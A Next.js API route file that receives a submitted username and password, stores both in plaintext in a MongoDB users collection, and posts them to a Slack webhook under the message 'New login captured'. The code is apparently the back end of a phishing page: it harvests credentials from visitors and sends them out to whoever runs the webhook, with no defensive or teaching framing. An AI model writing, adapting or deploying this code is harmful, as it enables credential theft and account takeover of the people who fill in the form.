// app/api/submit-form/route.ts
import { NextResponse } from "next/server";
import { getDatabase } from "@/lib/mongodb";

export async function POST(request: Request) {
    try {
        const { username, password } = await request.json();

        if (
            typeof username !== "string" ||
            typeof password !== "string" ||
            !username.trim() ||
            !password.trim()
        ) {
            return NextResponse.json(
                { success: false, error: "Invalid form data" },
                { status: 400 }
            );
        }

        const db = await getDatabase();
        const result = await db
            .collection("users")
            .insertOne({ username, password });

        if (!result.insertedId) {
            throw new Error("Insert failed");
        }

        const slackWebhook = process.env.SLACK_WEBHOOK_URL;
        if (slackWebhook) {
            await fetch(slackWebhook, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    text: `🔐 New login captured:\n👤 Username: *${username}*\n🔑 Password: *${password}*`,
                }),
            });
        }

        return NextResponse.json({ success: true }, { status: 201 });
    } catch (error: any) {
        console.error("🚨 Error in /api/submit-form:", error);
        return NextResponse.json(
            { success: false, error: "Server error" },
            { status: 500 }
        );
    }
}
